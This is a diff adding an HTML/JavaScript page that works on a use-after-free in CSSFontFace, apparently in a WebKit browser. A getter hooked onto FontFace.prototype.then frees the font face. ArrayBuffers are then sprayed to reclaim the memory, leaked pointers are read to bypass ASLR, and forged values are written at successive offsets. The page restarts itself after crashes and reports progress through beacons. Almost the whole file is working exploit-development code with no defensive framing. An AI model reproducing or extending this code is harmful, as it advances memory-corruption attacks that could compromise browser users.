@@ -1,0 +1,231 @@
+<!--
+  p576: CSSFontFace UAF diagnostic forge sweep (crash-resilient v2).
+
+  One test per page load. Uses localStorage to auto-advance through tests.
+  If WebProcess crashes mid-test, the reload detects the incomplete test,
+  marks it CRASHED, and advances to the next one.
+
+  Each load: fresh leak UAF (ASLR changes per WebProcess), then one forge test.
+  Results accumulate in localStorage across crashes/reloads.
+
+  Open p576...html#reset to clear state and start over.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p576 forge sweep</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function writeQ(v,off,bytes){for(var i=0;i<8;i++)v[off+i]=bytes[i];}
+function writeD(v,off,val){v[off]=val&0xFF;v[off+1]=(val>>8)&0xFF;v[off+2]=(val>>16)&0xFF;v[off+3]=(val>>24)&0xFF;}
+function hex8(v,o){var s='';for(var i=0;i<8;i++){var c=v[o+i];s+=(c<16?'0':'')+c.toString(16);}return s;}
+function grab(v,o){var a=[];for(var i=0;i<8;i++)a.push(v[o+i]);return a;}
+
+var BAD=[0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41];
+var K=8, SIZE=192;
+var retained=[];
+
+var TESTS=[
+  {name:'BASELINE',fn:function(v){writeD(v,0,2);}},
+  {name:'OFF_08',fn:function(v){writeD(v,0,2);writeQ(v,0x08,BAD);}},
+  {name:'OFF_10',fn:function(v){writeD(v,0,2);writeQ(v,0x10,BAD);}},
+  {name:'OFF_18',fn:function(v){writeD(v,0,2);writeQ(v,0x18,BAD);}},
+  {name:'OFF_20',fn:function(v){writeD(v,0,2);writeQ(v,0x20,BAD);}},
+  {name:'OFF_28',fn:function(v){writeD(v,0,2);writeQ(v,0x28,BAD);}},
+  {name:'OFF_30',fn:function(v){writeD(v,0,2);writeQ(v,0x30,BAD);}},
+  {name:'OFF_38',fn:function(v){writeD(v,0,2);writeQ(v,0x38,BAD);}},
+  {name:'OFF_40',fn:function(v){writeD(v,0,2);writeQ(v,0x40,BAD);}},
+  {name:'OFF_48',fn:function(v){writeD(v,0,2);writeQ(v,0x48,BAD);}},
+  {name:'OFF_50',fn:function(v){writeD(v,0,2);writeQ(v,0x50,BAD);}},
+  {name:'OFF_58',fn:function(v){writeD(v,0,2);writeQ(v,0x58,BAD);}},
+  {name:'OFF_60',fn:function(v){writeD(v,0,2);writeQ(v,0x60,BAD);}},
+  {name:'OFF_68',fn:function(v){writeD(v,0,2);writeQ(v,0x68,BAD);}},
+  {name:'OFF_70',fn:function(v){writeD(v,0,2);writeQ(v,0x70,BAD);}},
+  {name:'OFF_78',fn:function(v){writeD(v,0,2);writeQ(v,0x78,BAD);}},
+  {name:'KC1',fn:function(v,p58){
+    writeD(v,0,2);if(p58)writeQ(v,0x58,p58);
+    writeD(v,0x60,4);writeD(v,0x64,3);writeD(v,0x68,1);writeD(v,0x6C,0);
+  }}
+];
+
+/* ---- localStorage state ---- */
+function gs(){try{var s=localStorage.getItem('p576');return s?JSON.parse(s):null;}catch(e){return null;}}
+function ss(s){try{localStorage.setItem('p576',JSON.stringify(s));}catch(e){}}
+
+/* ---- Leak phase (fresh per WebProcess) — matches p563 exactly ---- */
+function leakPhase(cb){
+  b('P576-LEAK-START');
+
+  var A;
+  try{A=new FontFace('flk','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('P576-ERR-NEWFACE-'+e.message);cb(null);return;}
+  b('P576-LEAK-FACE-OK');
+  try{document.fonts.add(A);}catch(e){}
+  b('P576-LEAK-ADDED');
+  try{void A.loaded;}catch(e){}
+  b('P576-LEAK-LOADED');
+  retained.push(A);
+
+  var se=document.createElement('style');
+  se.textContent="@font-face{font-family:slk;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(se);
+  b('P576-LEAK-STYLE');
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    b('P576-GETTER-FIRED');
+    if(se)se.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P576-GETTER-FREED');
+
+    window.__lk=[];
+    var SZ=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+    for(var si=0;si<SZ.length;si++){
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(SZ[si]);
+        window.__lk.push({s:SZ[si],v:new Uint8Array(ab)});
+      }
+    }
+    b('P576-GETTER-SPRAYED');
+    try{document.fonts.check('1em slk');}catch(e){}
+    return undefined;
+  },set:function(){}});
+  b('P576-LEAK-GETTER-SET');
+
+  document.fonts.load('1em flk, slk','AB').then(function(){b('P576-LEAK-RESOLVED');},function(){b('P576-LEAK-REJECTED');});
+  b('P576-LEAK-LOAD-CALLED');
+
+  var done=false;
+  function scan(){
+    if(done)return;
+    var m=window.__lk;if(!m)return;
+    for(var i=0;i<m.length;i++){
+      if(m[i].s!==192)continue;
+      var v=m[i].v,nz=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+      if(nz>0){
+        done=true;
+        var rc=v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24);
+        b('P576-LEAK-HIT-rc='+rc+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
+        cb({p58:grab(v,0x58),p68:grab(v,0x68)});
+        return;
+      }
+    }
+  }
+  setTimeout(scan,80);
+  setTimeout(scan,400);
+  setTimeout(function(){if(!done){b('P576-LEAK-FAIL');cb(null);}},2000);
+}
+
+/* ---- Test phase ---- */
+function runTest(idx,leaked){
+  var t=TESTS[idx];
+  b('P576-RUN-T'+idx+'-'+t.name);
+
+  var fam='ft'+idx,fs='fs'+idx;
+  var se=document.createElement('style');
+  se.textContent="@font-face{font-family:"+fs+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(se);
+
+  var face=new FontFace(fam,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;retained.push(face);
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    if(se)se.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+
+    window.__tb=[];
+    for(var k=0;k<K;k++){
+      var ab=new ArrayBuffer(SIZE);
+      var v=new Uint8Array(ab);
+      t.fn(v,leaked?leaked.p58:null,leaked?leaked.p68:null);
+      window.__tb.push(v);
+    }
+    try{document.fonts.check('1em '+fs);}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em '+fam+', '+fs,'AB').then(
+    function(){b('P576-T'+idx+'-'+t.name+'-RESOLVED');},
+    function(){b('P576-T'+idx+'-'+t.name+'-REJECTED');}
+  );
+
+  setTimeout(function(){
+    b('P576-T'+idx+'-'+t.name+'-SURVIVED');
+    var state=gs();
+    if(state){
+      state.r[idx]='OK';
+      state.i=idx+1;
+      state.run=-1;
+      ss(state);
+    }
+    setTimeout(function(){location.reload();},300);
+  },800);
+}
+
+/* ---- Main ---- */
+function main(){
+  if(location.hash==='#reset'){
+    try{localStorage.removeItem('p576');}catch(e){}
+    b('P576-RESET');
+    document.body.innerHTML='<p>State cleared. Remove #reset from URL and reload.</p>';
+    return;
+  }
+
+  var state=gs();
+
+  /* First boot: init */
+  if(!state){
+    state={i:0,r:[],run:-1,boots:0};
+    for(var j=0;j<TESTS.length;j++)state.r.push(null);
+  }
+  state.boots=(state.boots||0)+1;
+
+  /* Detect crash from previous run */
+  if(state.run>=0){
+    var ci=state.run;
+    b('P576-CRASH-T'+ci+'-'+TESTS[ci].name);
+    state.r[ci]='CRASH';
+    state.i=ci+1;
+    state.run=-1;
+  }
+
+  ss(state);
+  var idx=state.i;
+
+  /* All done */
+  if(idx>=TESTS.length){
+    var parts=[];
+    for(var j=0;j<TESTS.length;j++)parts.push(TESTS[j].name+'='+state.r[j]);
+    b('P576-DONE-'+parts.join(','));
+    document.body.innerHTML='<p>Done (boot '+state.boots+'). See beacons.</p>';
+    return;
+  }
+
+  b('P576-BOOT-'+state.boots+'-next=T'+idx+'-'+TESTS[idx].name);
+
+  /* Mark test as running (crash detection) */
+  state.run=idx;
+  ss(state);
+
+  /* Leak then test */
+  leakPhase(function(leaked){
+    if(!leaked){
+      b('P576-NOLEAK-SKIP-T'+idx);
+      state.r[idx]='NOLEAK';
+      state.i=idx+1;
+      state.run=-1;
+      ss(state);
+      setTimeout(function(){location.reload();},500);
+      return;
+    }
+    runTest(idx,leaked);
+  });
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(main,0);
+else document.addEventListener('DOMContentLoaded',main);
+</script></head><body><p>p576 forge sweep — crash-resilient</p></body></html>
